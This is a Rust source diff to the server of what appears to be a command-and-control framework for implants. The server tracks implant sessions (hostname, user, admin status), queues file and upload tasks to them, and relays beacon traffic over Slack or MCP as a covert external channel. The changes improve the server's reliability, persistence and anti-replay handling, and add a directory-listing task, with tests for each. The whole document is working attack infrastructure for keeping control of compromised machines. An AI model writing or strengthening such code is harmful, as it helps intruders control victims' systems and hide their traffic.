@@ -243,6 +243,13 @@ enum PersistCmd {
     Upsert { rec: nyx_store::SessionRecord },
     /// Bump only `last_seen` for an existing session (throttled per-session).
     Touch { session_id: String, last_seen: u64 },
+    /// Persist the S2C send counter + C2S last-received counter after every
+    /// beacon frame (contract 4), so both counter spaces survive a restart.
+    UpdateCounters {
+        session_id: String,
+        send_counter: u64,
+        last_recv: u64,
+    },
     /// Delete a session row (GC evicted it). The store must not accumulate
     /// dead rows forever.
     Delete { session_id: String },
@@ -295,6 +302,16 @@ impl SessionPersistence {
                     session_id,
                     last_seen,
                 } => ("touch", store.touch(&session_id, last_seen).map(|_| ())),
+                PersistCmd::UpdateCounters {
+                    session_id,
+                    send_counter,
+                    last_recv,
+                } => (
+                    "update_counters",
+                    store
+                        .update_counters(&session_id, send_counter, last_recv)
+                        .map(|_| ()),
+                ),
                 PersistCmd::Delete { session_id } => {
                     ("delete", store.delete(&session_id).map(|_| ()))
                 }
@@ -325,6 +342,15 @@ impl SessionPersistence {
         let _ = self.tx.send(PersistCmd::Touch {
             session_id,
             last_seen,
+        });
+    }
+
+    /// Fire-and-forget send/recv counter persistence (after each beacon frame).
+    pub fn update_counters(&self, session_id: String, send_counter: u64, last_recv: u64) {
+        let _ = self.tx.send(PersistCmd::UpdateCounters {
+            session_id,
+            send_counter,
+            last_recv,
         });
     }
 
@@ -422,14 +448,16 @@ pub fn load_persisted_sessions(state: &AppState) -> usize {
                 // was consumed at the original check-in; don't replay it.
                 auth_token: None,
             },
-            // Reset the anti-replay counter for the new server lifetime.
-            // Counter space is per-server-identity: a frame from before the
-            // restart either fails AEAD under the (possibly new) server key, or
-            // carries a counter that's stale only relative to the OLD lifetime.
-            // Setting last_recv = 0 lets the first post-restart counter (>= 1)
-            // through, which is the correct post-restart semantics.
-            last_recv: 0,
-            send_counter: 0,
+            // Restore the send/recv counters persisted with the row (contract
+            // 4) so BOTH counter spaces continue across a restart: the C2S
+            // watermark (`last_recv`) keeps the anti-replay check continuous —
+            // the implant's next counter (> persisted last_recv) passes — and
+            // the S2C nonce space (`send_counter`) resumes where it left off
+            // instead of reusing nonces the implant already saw. Legacy rows
+            // written before the columns existed restore as 0 (the columns
+            // DEFAULT 0), which preserves the pre-restore semantics for them.
+            last_recv: r.last_recv,
+            send_counter: r.send_counter,
             next_task_id: 1,
             pending: Vec::new(),
             results: Vec::new(),
@@ -584,9 +612,12 @@ const FINGERPRINT_TTL: u64 = 60;
 /// Spawn a background task that periodically evicts stale sessions.
 ///
 /// Two policies run every 60 seconds:
-/// 1. Age: evict sessions older than `NYX_SESSION_MAX_AGE` (default 7 days).
+/// 1. Age: evict sessions older than `NYX_SESSION_MAX_AGE` (default 7 days)
+///    that are ALSO idle longer than `NYX_SESSION_MAX_IDLE` — a session that
+///    checked in recently (a live beacon) is never evicted just because it is
+///    old.
 /// 2. Idle: evict sessions idle (no beacon) longer than `NYX_SESSION_MAX_IDLE`
-///    (default 24h) that have zero pending tasks.
+///    (default 24h) that have zero pending tasks (queued tasks exempt them).
 ///
 /// Each eviction is logged at INFO level so operators can see when a beacon
 /// drops offline permanently.
@@ -617,7 +648,11 @@ pub fn spawn_session_gc(state: Arc<AppState>) {
                 .filter_map(|entry| {
                     let age = now.duration_since(entry.value().created).as_secs();
                     let idle = now.duration_since(entry.value().last_seen).as_secs();
-                    let too_old = age > max_age;
+                    // Age-eviction also requires the session to be idle: a
+                    // session that checked in recently is alive and must never
+                    // be evicted just because it is old. Idle-eviction exempts
+                    // sessions with queued pending tasks (delivery in flight).
+                    let too_old = age > max_age && idle > max_idle;
                     let too_idle = idle > max_idle && entry.value().pending.is_empty();
                     if too_old || too_idle {
                         Some(*entry.key())
@@ -820,11 +855,11 @@ async fn beacon(
 ///
 /// Runs the normal beacon path (decrypt → queue results → seal reply) and then,
 /// **in addition**, forwards the sealed reply frame to the real Slack channel
-/// via [`nyx_transport::SlackTransport`] when the operator has configured
-/// `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL`. The relay is
-/// fire-and-forget: a Slack outage never fails the beacon reply, which is
-/// still returned to the implant over the local HTTP connection exactly as
-/// `/beacon` would have returned it.
+/// via the shared boot-time transport stack when the operator has configured
+/// `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL` +
+/// `NYX_EXTC2_SLACK_HMAC_KEY`. The relay is fire-and-forget: a Slack outage
+/// never fails the beacon reply, which is still returned to the implant over
+/// the local HTTP connection exactly as `/beacon` would have returned it.
 ///
 /// When the Slack relay is unconfigured, this handler is functionally
 /// identical to [`beacon`] — preserving the legacy behaviour for operators
@@ -839,10 +874,9 @@ async fn extc2_relay_handler_slack(
     match handle_beacon(&st, &peer, &method, &headers, &body) {
         Ok(frame) => {
             // Fan out a COPY of the reply to Slack before shaping/responding.
-            // `Bytes::clone` is Arc-backed (cheap; no allocation).
-            if let Some(slack) = &st.extc2.slack {
-                extc2_relay::relay_reply_to_slack(slack, frame.clone());
-            }
+            // `Bytes::clone` is Arc-backed (cheap; no allocation). No-op when
+            // the relay is unconfigured (stack is None).
+            extc2_relay::relay_reply_to_slack(&st.extc2, frame.clone());
             shape_beacon_response(&st, frame)
         }
         Err(e) => {
@@ -853,8 +887,8 @@ async fn extc2_relay_handler_slack(
 }
 
 /// External-C2 MCP relay handler. Same shape as [`extc2_relay_handler_slack`]
-/// but forwards the reply to the configured MCP server via
-/// [`nyx_transport::McpTransport`] (`tools/call`).
+/// but forwards the reply to the configured MCP server via the shared
+/// boot-time transport stack (`tools/call`).
 async fn extc2_relay_handler_mcp(
     State(st): State<Arc<AppState>>,
     ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
@@ -864,9 +898,7 @@ async fn extc2_relay_handler_mcp(
 ) -> Response {
     match handle_beacon(&st, &peer, &method, &headers, &body) {
         Ok(frame) => {
-            if let Some(mcp) = &st.extc2.mcp {
-                extc2_relay::relay_reply_to_mcp(mcp, frame.clone());
-            }
+            extc2_relay::relay_reply_to_mcp(&st.extc2, frame.clone());
             shape_beacon_response(&st, frame)
         }
         Err(e) => {
@@ -1132,7 +1164,7 @@ fn resolve_session_key(
     raw: &nyx_protocol::RawFrame,
 ) -> anyhow::Result<(bool, SessionKey)> {
     match st.sessions.get(&raw.pubkey) {
-        None => Ok((true, st.keypair.derive_for(&raw.pubkey))),
+        None => Ok((true, st.keypair.derive_for(&raw.pubkey)?)),
         Some(s) => {
             if raw.counter <= s.last_recv {
                 anyhow::bail!("replayed/stale counter {}", raw.counter);
@@ -1147,7 +1179,7 @@ fn resolve_session_key(
                 // it. This is safe because derive_for is deterministic in the
                 // server identity + implant pubkey, so a frame that decrypts
                 // under this key is genuine.
-                Ok((false, st.keypair.derive_for(&raw.pubkey)))
+                Ok((false, st.keypair.derive_for(&raw.pubkey)?))
             } else {
                 Ok((false, s.key.clone()))
             }
@@ -1170,7 +1202,27 @@ fn handle_new_session(
         anyhow::bail!("session registry full ({MAX_SESSIONS}); refusing new check-in");
     }
     let mut r = Reader::new(&plaintext);
-    let info = SessionInfo::decode(&mut r)?;
+    let info = match SessionInfo::decode(&mut r) {
+        Ok(info) => info,
+        Err(_) => {
+            // Not a SessionInfo. The only other body a valid session sends is a
+            // TaskResponse batch — the shape an implant that ALREADY registered
+            // (and consumed its one-time token) sends. This arrives at a NEW
+            // session only when the server lost the in-memory session without
+            // the implant noticing (a restart with no persisted row — row GC'd,
+            // persistence disabled — or a live session evicted and its row
+            // dropped). Re-admit: re-register the session under the SAME pubkey
+            // (preserving the pubkey→session mapping) and process the frame as
+            // an existing session. The AEAD decrypt above already proved the
+            // implant holds the session key, so no re-authentication is needed.
+            if TaskResponse::decode_vec(&plaintext).is_err() {
+                anyhow::bail!(
+                    "check-in body is neither a SessionInfo nor a TaskResponse batch"
+                );
+            }
+            return handle_readmission(st, raw, key, plaintext);
+        }
+    };
 
     // Validate one-time auth_token if present (per-implant generated implants).
     // Legacy implants (compile-time config, no token) skip this check.
@@ -1183,23 +1235,43 @@ fn handle_new_session(
             Some(store) => {
                 match store.get_by_token_hash(&token_hash) {
                     Ok(Some(rec)) => {
-                        // Token valid — mark as consumed. Check the result:
-                        // a failure here means the token may still be
-                        // replayable, so log at error severity. Do NOT bail
-                        // — the session is already validated at this point.
-                        if let Err(e) = store.mark_token_used(&rec.implant_pub) {
-                            tracing::error!(
-                                error = %e,
-                                implant_pub = %rec.implant_pub,
-                                implant_id = rec.id,
-                                "mark_token_used failed; one-time token may be replayable"
-                            );
+                        // Token validated — now atomically consume it. The
+                        // consume is the anti-replay claim for one-time tokens:
+                        // a concurrent check-in carrying the same token loses
+                        // the UPDATE race (0 rows) and must be REJECTED, and a
+                        // store error means the token may still be replayable —
+                        // also rejected. Fail CLOSED: never accept a check-in
+                        // whose token consumption wasn't confirmed.
+                        match store.mark_token_used(&rec.implant_pub) {
+                            Ok(true) => {
+                                tracing::info!(
+                                    implant_pub = %rec.implant_pub,
+                                    implant_id = rec.id,
+                                    "auth_token validated and consumed"
+                                );
+                            }
+                            Ok(false) => {
+                                tracing::warn!(
+                                    implant_pub = %rec.implant_pub,
+                                    implant_id = rec.id,
+                                    "mark_token_used consumed 0 rows; token already claimed by \
+                                     a concurrent check-in — rejecting"
+                                );
+                                anyhow::bail!(
+                                    "auth_token already consumed by another check-in"
+                                );
+                            }
+                            Err(e) => {
+                                tracing::error!(
+                                    error = %e,
+                                    implant_pub = %rec.implant_pub,
+                                    implant_id = rec.id,
+                                    "mark_token_used failed; one-time token may be replayable — \
+                                     rejecting check-in"
+                                );
+                                anyhow::bail!("auth_token consumption failed; rejecting check-in");
+                            }
                         }
-                        tracing::info!(
-                            implant_pub = %rec.implant_pub,
-                            implant_id = rec.id,
-                            "auth_token validated and consumed"
-                        );
                     }
                     Ok(None) => {
                         // Token not found, already used, or revoked.
@@ -1326,6 +1398,12 @@ fn handle_new_session(
                     is_admin,
                     first_seen: boot_time,
                     last_seen: boot_time,
+                    // Persist the C2S watermark from THIS check-in so a restart
+                    // right after registration keeps the anti-replay continuity
+                    // (the next beacon, counter+1, passes the restored check).
+                    // No S2C frame was sent yet, so send_counter is 0.
+                    send_counter: 0,
+                    last_recv: raw.counter,
                     // SessionInfo.auth_token is [u8;32]; the store keeps a Vec.
                     // By the time this row is written the token has already been
                     // consumed in the `implants` table, so this is forensic, not
@@ -1353,6 +1431,65 @@ fn handle_new_session(
             anyhow::bail!("concurrent check-in race: session already registered");
         }
     }
+}
+
+/// Re-admit a session whose first post-restart message is a [`TaskResponse`]
+/// batch rather than a [`SessionInfo`].
+///
+/// A previously-registered implant (its one-time token already validated and
+/// consumed) keeps sending response batches after the server loses the
+/// in-memory session — a restart whose row was GC'd or never persisted, or a
+/// live session evicted with its row dropped. The check-in is NOT a new
+/// session, so we re-register it under the SAME pubkey — preserving the
+/// pubkey→session mapping and counter continuity — then process this frame
+/// through the normal existing-session path (results → buffer, reply with
+/// queued tasks, counter persistence).
+///
+/// Session metadata is unknown (no SessionInfo on the wire); the row is
+/// re-upserted with full metadata on the next genuine SessionInfo check-in.
+fn handle_readmission(
+    st: &AppState,
+    raw: &nyx_protocol::RawFrame,
+    key: SessionKey,
+    plaintext: Vec<u8>,
+) -> anyhow::Result<Vec<u8>> {
+    let session = Session {
+        key: key.clone(),
+        info: SessionInfo {
+            beacon_id: 0,
+            hostname: String::new(),
+            username: String::new(),
+            os: String::new(),
+            arch: 0,
+            pid: 0,
+            is_admin: 0,
+            auth_token: None,
+        },
+        // Accept THIS frame: the next beacon's counter must be > raw.counter.
+        last_recv: raw.counter.saturating_sub(1),
+        send_counter: 0,
+        next_task_id: 1,
+        pending: Vec::new(),
+        results: Vec::new(),
+        created: Instant::now(),
+        last_seen: Instant::now(),
+        ja3: None,
+        ja4: None,
+        stale: false,
+        persisted_last_touch: Instant::now(),
+    };
+    match st.sessions.entry(raw.pubkey) {
+        Entry::Vacant(v) => {
+            v.insert(session);
+        }
+        Entry::Occupied(_) => {
+            // A concurrent beacon re-admitted (or fully registered) this pubkey
+            // first; its session wins — process this frame against it below.
+        }
+    }
+    // Delegate the rest (responses → results, reply with queued tasks, counter
+    // persistence) to the existing-session path.
+    handle_existing_session(st, raw, key, plaintext)
 }
 
 fn handle_existing_session(
@@ -1438,9 +1575,56 @@ fn handle_existing_session(
             s.results.drain(0..drop_n);
         }
     }
-    let tasks = std::mem::take(&mut s.pending);
+    // Contract 2: pack pending tasks greedily into a batch whose sealed frame
+    // fits under the protocol's MAX_CT_LEN (512 KiB ciphertext). Ciphertext
+    // length is exactly plaintext + TAG_LEN, so a batch's plaintext budget is
+    // MAX_CT_LEN - TAG_LEN. Tasks that don't fit — an unencodable task (a
+    // WireError, e.g. a blob over the wire cap) or one that alone would exceed
+    // the frame cap — stay QUEUED: NEVER dequeue a task whose frame wasn't
+    // confirmed encodable. FIFO order is preserved: the batch takes the oldest
+    // tasks and deferred ones keep their relative order.
+    //
+    // The task-count guard mirrors `Task::encode_vec`'s silent truncation at
+    // MAX_WIRE_COUNT (256, protocol-internal): without it, a batch over 256
+    // tasks would have the tail silently dropped from the reply while the
+    // tasks were already dequeued.
+    let mut batch: Vec<Task> = Vec::new();
+    let mut batch_plain: usize = 4; // u32 count prefix
+    let mut deferred: Vec<Task> = Vec::new();
+    for t in std::mem::take(&mut s.pending) {
+        // Encode the task alone to measure its plaintext contribution (4-byte
+        // count prefix + task bytes). An encode error means it can NEVER be
+        // delivered as-is, so keep it queued for the operator to split.
+        let single_plain = match Task::encode_vec(std::slice::from_ref(&t)) {
+            Ok(bytes) => bytes.len().saturating_sub(4),
+            Err(_) => {
+                deferred.push(t);
+                continue;
+            }
+        };
+        if batch.len() < 256
+            && batch_plain + single_plain <= nyx_protocol::frame::MAX_CT_LEN - nyx_protocol::TAG_LEN
+        {
+            batch_plain += single_plain;
+            batch.push(t);
+        } else {
+            deferred.push(t);
+        }
+    }
+    s.pending = deferred;
     s.send_counter += 1;
     let counter = s.send_counter;
+    // Contract 4: persist the send/recv counters after this frame (fire-and-
+    // forget, off the hot path, like the touch) so both counter spaces survive
+    // a restart. `last_recv` was already advanced to `raw.counter` above.
+    let persist_counters = st.sessions_db.as_ref().map(|persist| {
+        (
+            persist.clone(),
+            hex::encode(raw.pubkey),
+            counter,
+            raw.counter,
+        )
+    });
     drop(s);
     // Fire the throttled last_seen persistence write now that the shard
     // lock is released. Best-effort, non-blocking: if the background thread
@@ -1448,10 +1632,25 @@ fn handle_existing_session(
     if let Some((persist, id, ts)) = persist_touch {
         persist.touch(id, ts);
     }
+    if let Some((persist, id, sc, lr)) = persist_counters {
+        persist.update_counters(id, sc, lr);
+    }
     for ev in fired {
         st.events.fire(&ev);
     }
-    let reply = Task::encode_vec(&tasks)?;
+    let reply = match Task::encode_vec(&batch) {
+        Ok(reply) => reply,
+        Err(e) => {
+            // The batch was already dequeued — put it back so its tasks aren't
+            // lost (the check-in fails and the implant retries with a fresh
+            // counter). Best-effort: if the session was evicted meanwhile, the
+            // tasks are dropped with it.
+            if let Some(mut s) = st.sessions.get_mut(&raw.pubkey) {
+                s.pending.splice(0..0, batch);
+            }
+            return Err(anyhow::anyhow!("failed to encode task batch: {e}"));
+        }
+    };
     encode_frame_dir(
         &raw.pubkey,
         Direction::ServerToClient,
@@ -1459,7 +1658,13 @@ fn handle_existing_session(
         &key,
         &reply,
     )
-    .map_err(|e| anyhow::anyhow!("failed to seal S2C reply: {e}"))
+    .map_err(|e| {
+        // Same re-queue on a seal failure: never lose dequeued tasks.
+        if let Some(mut s) = st.sessions.get_mut(&raw.pubkey) {
+            s.pending.splice(0..0, batch);
+        }
+        anyhow::anyhow!("failed to seal S2C reply: {e}")
+    })
 }
 /// Channel-agnostic beacon frame handler (spec-1).
 ///
@@ -1793,6 +1998,7 @@ impl JsonCommand {
                     "rm" => FileOp::Rm,
                     "mv" => FileOp::Mv,
                     "cp" => FileOp::Cp,
+                    "ls" => FileOp::Ls,
                     _ => return Err("bad file op"),
                 };
                 Command::FileOp {
@@ -2341,6 +2547,7 @@ fn fileop_label(op: &FileOp) -> &'static str {
         FileOp::Rm => "rm",
         FileOp::Mv => "mv",
         FileOp::Cp => "cp",
+        FileOp::Ls => "ls",
     }
 }
 
@@ -2804,6 +3011,8 @@ mod tests {
                 is_admin: 1,
                 first_seen: now_unix().saturating_sub(3600),
                 last_seen: now_unix().saturating_sub(60),
+                send_counter: 0,
+                last_recv: 0,
                 auth_token: None,
             })
             .unwrap();
@@ -2845,6 +3054,8 @@ mod tests {
                 is_admin: 0,
                 first_seen: now_unix().saturating_sub(100),
                 last_seen: now_unix().saturating_sub(50),
+                send_counter: 0,
+                last_recv: 0,
                 auth_token: None,
             })
             .unwrap();
@@ -2859,8 +3070,9 @@ mod tests {
 
         // The restored session's `key` is a zero placeholder; re-derive the real
         // key the way handle_frame does, then build a subsequent-frame beacon.
-        let key = st.keypair.derive_for(&pubkey);
-        // last_recv was set to u64::MAX on restore, so any counter is accepted.
+        let key = st.keypair.derive_for(&pubkey).unwrap();
+        // last_recv was restored from the persisted row (0), so counter 1 passes
+        // the anti-replay check and the beacon clears the stale flag.
         let frame = response_frame(&pubkey, &key, 1);
         let peer: std::net::SocketAddr = "127.0.0.1:7810".parse().unwrap();
         handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
@@ -2986,6 +3198,243 @@ mod tests {
         }
     }
 
+    // ---- Counter persistence (contract 4) + task batching (contract 2) -----
+
+    #[test]
+    fn existing_beacon_persists_counters() {
+        // Every existing-session frame must persist the send/recv counters
+        // (fire-and-forget) so both counter spaces survive a restart.
+        let (st, store) = state_with_persistence();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7840".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("check-in must register the session");
+
+        // First existing-session beacon: C2S counter 2 → S2C counter 1.
+        let f = response_frame(&pubkey, &key, 2);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
+            .expect("existing-session beacon must succeed");
+
+        // The writer is async; poll the store until the counters land.
+        let id_hex = hex::encode(pubkey);
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
+        loop {
+            let row = store
+                .list()
+                .unwrap()
+                .into_iter()
+                .find(|r| r.session_id == id_hex);
+            if let Some(r) = row {
+                if r.last_recv == 2 && r.send_counter == 1 {
+                    return;
+                }
+            }
+            if std::time::Instant::now() > deadline {
+                panic!(
+                    "counters never landed in the store: {:?}",
+                    store.list().unwrap()
+                );
+            }
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        }
+    }
+
+    #[test]
+    fn restore_honors_persisted_counters() {
+        // A row restored at boot must carry its persisted send/recv counters,
+        // and the first post-restart beacon (counter = last_recv + 1) must pass
+        // the anti-replay check — counter continuity across restarts.
+        let store = nyx_store::SessionStore::open_in_memory().unwrap();
+        let mut pk = [0u8; 32];
+        pk[0] = 0xCD;
+        store
+            .upsert(&nyx_store::SessionRecord {
+                session_id: hex::encode(pk),
+                beacon_id: 9,
+                hostname: "cont".into(),
+                username: "u".into(),
+                os: "linux".into(),
+                arch: 1,
+                pid: 3,
+                is_admin: 0,
+                first_seen: now_unix().saturating_sub(120),
+                last_seen: now_unix().saturating_sub(60),
+                send_counter: 17,
+                last_recv: 41,
+                auth_token: None,
+            })
+            .unwrap();
+
+        let persist = SessionPersistence::spawn(std::sync::Arc::new(store));
+        let st = std::sync::Arc::new(AppState {
+            sessions_db: Some(std::sync::Arc::new(persist)),
+            ..AppState::default()
+        });
+        load_persisted_sessions(&st);
+        // Scope the DashMap read-ref: it must be dropped before handle_beacon
+        // takes a write-guard on the same shard (get_mut would deadlock).
+        let (restored_send, restored_recv) = {
+            let s = st.sessions.get(&pk).expect("restored session present");
+            (s.send_counter, s.last_recv)
+        };
+        assert_eq!(restored_send, 17, "restore must carry send_counter");
+        assert_eq!(restored_recv, 41, "restore must carry last_recv");
+
+        // The next beacon (counter 42 > 41) must be accepted via the
+        // existing-session path, and its reply must use S2C counter 18.
+        let key = st.keypair.derive_for(&pk).unwrap();
+        let frame = response_frame(&pk, &key, 42);
+        let peer: std::net::SocketAddr = "127.0.0.1:7841".parse().unwrap();
+        let reply = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
+            .expect("post-restore beacon at last_recv+1 must succeed");
+        let raw = nyx_protocol::parse_frame(&reply).expect("reply is a frame");
+        assert_eq!(raw.counter, 18, "S2C counter resumes at restored+1");
+        let plain = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw)
+            .expect("reply decrypts under the session key");
+        let tasks = Task::decode_vec(&plain).expect("reply is a task batch");
+        assert!(tasks.is_empty(), "no tasks were queued");
+    }
+
+    #[test]
+    fn task_batching_respects_frame_cap_and_keeps_fifo() {
+        // Contract 2: pending tasks that don't fit in ONE frame under
+        // MAX_CT_LEN stay queued (FIFO); only the confirmed-encodable prefix
+        // is sent. Two 256 KiB upload blobs encode individually, but their
+        // combined batch exceeds the 512 KiB frame cap, so exactly one is
+        // delivered per beacon; the remainder must still be in pending.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7842".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("check-in must register the session");
+
+        let big = vec![0x41u8; 256 * 1024];
+        {
+            let mut s = st.sessions.get_mut(&pubkey).unwrap();
+            s.pending.push(Task {
+                task_id: 1,
+                command: Command::Upload {
+                    name: "a.bin".into(),
+                    data: big.clone(),
+                },
+            });
+            s.pending.push(Task {
+                task_id: 2,
+                command: Command::Upload {
+                    name: "b.bin".into(),
+                    data: big.clone(),
+                },
+            });
+        }
+
+        // First beacon delivers only task 1 (the FIFO prefix that fits).
+        let f1 = response_frame(&pubkey, &key, 2);
+        let reply1 = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f1)
+            .expect("beacon 1 must succeed");
+        let raw1 = nyx_protocol::parse_frame(&reply1).expect("reply is a frame");
+        let plain1 = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw1)
+            .expect("reply decrypts");
+        let tasks1 = Task::decode_vec(&plain1).expect("reply is a task batch");
+        assert_eq!(tasks1.len(), 1, "only the fitting prefix may be sent");
+        assert_eq!(tasks1[0].task_id, 1, "FIFO: oldest task goes first");
+        assert_eq!(
+            st.sessions.get(&pubkey).unwrap().pending.len(),
+            1,
+            "task 2 stays queued"
+        );
+        assert_eq!(st.sessions.get(&pubkey).unwrap().pending[0].task_id, 2);
+
+        // Second beacon delivers the remainder.
+        let f2 = response_frame(&pubkey, &key, 3);
+        let reply2 = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f2)
+            .expect("beacon 2 must succeed");
+        let raw2 = nyx_protocol::parse_frame(&reply2).unwrap();
+        let plain2 = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw2).unwrap();
+        let tasks2 = Task::decode_vec(&plain2).unwrap();
+        assert_eq!(tasks2.len(), 1);
+        assert_eq!(tasks2[0].task_id, 2);
+        assert!(
+            st.sessions.get(&pubkey).unwrap().pending.is_empty(),
+            "queue drained"
+        );
+    }
+
+    #[test]
+    fn unencodable_task_stays_queued_never_dequeued() {
+        // A task that cannot be encoded (blob over MAX_BLOB_LEN) must NEVER be
+        // dequeued — it stays in pending while smaller tasks flow around it.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7843".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).unwrap();
+
+        let over = vec![0x42u8; 256 * 1024 + 1]; // exceeds MAX_BLOB_LEN
+        {
+            let mut s = st.sessions.get_mut(&pubkey).unwrap();
+            s.pending.push(Task {
+                task_id: 1,
+                command: Command::Upload {
+                    name: "over.bin".into(),
+                    data: over,
+                },
+            });
+            s.pending.push(Task {
+                task_id: 2,
+                command: Command::Ping,
+            });
+        }
+
+        let f = response_frame(&pubkey, &key, 2);
+        let reply = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f).unwrap();
+        let raw = nyx_protocol::parse_frame(&reply).unwrap();
+        let plain = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw).unwrap();
+        let tasks = Task::decode_vec(&plain).unwrap();
+        assert_eq!(tasks.len(), 1, "only the encodable task is sent");
+        assert_eq!(tasks[0].task_id, 2);
+        let s = st.sessions.get(&pubkey).unwrap();
+        assert_eq!(s.pending.len(), 1, "unencodable task stays queued");
+        assert_eq!(s.pending[0].task_id, 1);
+    }
+
+    #[test]
+    fn readmission_registers_session_from_response_batch() {
+        // An implant that already registered sends a TaskResponse batch as its
+        // next beacon; if the server lost the in-memory session (restart / GC)
+        // it must re-admit the session under the same pubkey and process the
+        // frame instead of failing with a decode error.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7844".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).unwrap();
+
+        // Simulate the loss: drop the session without the implant noticing.
+        st.sessions.remove(&pubkey);
+
+        // The implant beacons with a real TaskResponse batch (not SessionInfo).
+        let plain = TaskResponse::encode_vec(&[TaskResponse {
+            task_id: 7,
+            response: MsgResponse::Ok,
+        }])
+        .expect("tiny response batch encodes");
+        let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plain)
+            .expect("test seal");
+        let reply = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
+            .expect("response-batch beacon must be re-admitted, not rejected");
+
+        // The session was re-registered under the same pubkey and the response
+        // was buffered; the reply is a sealed (empty) task batch with S2C:1.
+        let s = st.sessions.get(&pubkey).expect("session re-admitted under same pubkey");
+        assert_eq!(s.results.len(), 1, "response batch must be processed");
+        assert_eq!(s.results[0].task_id, 7);
+        assert!(!s.stale);
+        let raw = nyx_protocol::parse_frame(&reply).expect("reply is a frame");
+        assert_eq!(raw.counter, 1, "re-admitted session replies from S2C:1");
+    }
+
     // ---- Anti-replay (authoritative write-guard check) ---------------------
     //
     // These two tests pin the security fix that moved the replay decision INTO
@@ -2999,7 +3448,7 @@ mod tests {
     /// `pubkey`, keyed under the server in `st`. Mirrors what a dev implant
     /// sends on first contact. Returns the derived session key + the frame.
     fn checkin_frame(st: &AppState, pubkey: &[u8; 32], counter: u64) -> (SessionKey, Vec<u8>) {
-        let key = st.keypair.derive_for(pubkey);
+        let key = st.keypair.derive_for(pubkey).unwrap();
         let info = SessionInfo {
             beacon_id: 0x1337,
             hostname: "test-host".into(),
